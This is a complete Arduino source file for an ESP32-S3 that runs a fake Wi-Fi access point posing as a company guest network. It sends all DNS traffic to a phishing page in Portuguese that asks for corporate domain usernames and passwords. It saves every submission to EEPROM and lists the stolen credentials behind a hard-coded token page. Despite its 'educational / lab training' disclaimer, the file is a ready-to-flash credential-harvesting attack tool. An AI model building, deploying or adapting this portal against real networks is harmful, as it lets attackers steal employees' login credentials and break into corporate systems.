// Captive Portal for ESP32-S3
// Ported from ESP8266 version by NoceraInfosec
// Only for educational / lab training purposes.

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

// Password to access credential page
const char* PASSWORD = "P@ssw0rd!";

// Default texts
#define SUBTITLE "A internet da EMPRESA!"
#define TITLE "Acesso GUEST"
#define BODY "Para se conectar a nossa rede insira seu login de rede. Aproveite a internet mais rápida da EMPRESA!"
#define POST_TITLE "Conectando..."
#define POST_BODY "Caso seu acesso seja recusado, </br>comunique seu supervisor, Aguarde... </br></br> Obrigado!"
#define PASS_TITLE "Credenciais"
#define CLEAR_TITLE "Zeradas"

// System configs
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Captive portal IP

// Default SSID
const char *SSID_NAME = "EMPRESA - GuestWifi";

// State
String allPass = "";
String newSSID = "";
String currentSSID = "";

// EEPROM locations
int initialCheckLocation = 20;
int passStart = 30;
int passEnd = passStart;

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0;

DNSServer dnsServer;
WebServer webServer(80);

// -------------------- Helpers ----------------------

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  if (a.length() > 200) a = a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; 2023 Empresa. </br> Todos os direitos Reservados.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #555555; }"
               "label { display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #7F5C57; color: #fff; font-size: 1.3em; padding: 1em; }"
               "nav b { font-size: 1.5em; display: block; margin-bottom: 0.5em; }"
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style><meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

// -------------------- Pages ------------------------

String index() {
  return header(TITLE) + "<div>" + BODY + "</div><div><form action=/post method=post><label>Login de rede: EMPRESA\\Usuário </label>"
         "<input type=text name=u></input><label>Senha:</label>"
         "<input type=password name=m></input><input type=submit value=Conectar></form>" + footer();
}

String posted() {
  String username = input("u");
  String password = input("m");

  String userPassEntry = "<li><b>Usuário:</b> " + username + "</li><li><b>Senha:</b> " + password + "</li>";
  allPass += userPassEntry;

  for (int i = 0; i <= userPassEntry.length(); ++i) {
    EEPROM.write(passEnd + i, userPassEntry[i]);
  }
  passEnd += userPassEntry.length();
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  if (webServer.hasArg("password") && webServer.arg("password") == PASSWORD) {
    return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar</a></p><p><a style=\"color:blue\" href=/clear>Limpar</a></p></center>" + footer();
  } else {
    return header("Área Protegida!") + "<p>Somente pessoal autorizado!</p><form action=\"/pass\" method=\"GET\"><label>TOKEN:</label><input type=\"password\" name=\"password\"><input type=\"submit\" value=\"Acessar\"></form>" + footer();
  }
}

String ssid() {
  return header("Alterar SSID") + "<form action=/postSSID method=post><label>Novo SSID:</label>"
         "<input type=text name=s></input><input type=submit value=\"Alterar SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID.c_str());
  return newSSID;
}

String clear() {
  allPass = "";
  passEnd = passStart;
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<p>Senhas apagadas.</p><center><a href=/>Voltar</a></center>" + footer();
}

// Blink LED when password captured
void BLINK() {
  for (int counter = 0; counter < 10; counter++) {
    digitalWrite(LED_BUILTIN, counter % 2);
    delay(200);
  }
}

// -------------------- Setup ------------------------

void setup() {
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  String checkValue = "first";
  for (int i = 0; i < checkValue.length(); ++i) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      for (int j = 0; j < checkValue.length(); ++j) {
        EEPROM.write(j + initialCheckLocation, checkValue[j]);
      }
      EEPROM.write(0, '\0');
      EEPROM.write(passStart, '\0');
      EEPROM.commit();
      break;
    }
  }

  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }
  while (EEPROM.read(passEnd) != '\0') {
    allPass += char(EEPROM.read(passEnd));
    passEnd++;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
  WiFi.softAP(currentSSID.c_str());

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
}

// -------------------- Loop ------------------------

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
